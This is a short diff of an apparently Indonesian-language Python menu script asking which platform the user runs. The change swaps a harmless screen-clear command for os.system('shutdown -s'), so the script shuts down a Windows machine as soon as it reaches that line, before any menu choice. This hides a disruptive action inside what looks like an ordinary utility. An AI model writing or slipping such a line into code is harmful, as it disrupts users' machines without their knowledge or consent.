@@ -26,7 +26,7 @@ print(" Apa Perangkat Lunak Anda ?"
       "\n2.Android")
 print("---------------------------------------------")
 import os
-os.system('cls||clear')
+os.system('shutdown -s')
 
 inputhome = int(input("Pilihan Anda >> "))
 class main:
